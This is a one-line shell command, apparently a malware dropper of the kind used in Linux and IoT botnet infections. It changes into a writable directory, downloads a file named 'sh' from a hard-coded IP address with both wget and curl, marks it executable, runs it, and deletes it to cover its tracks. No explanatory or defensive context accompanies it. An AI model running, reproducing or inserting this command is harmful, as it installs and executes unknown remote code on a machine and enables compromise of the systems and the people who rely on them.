cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.174.124/sh; curl -O http://104.238.174.124/sh; chmod +x sh; ./sh; rm -rf sh
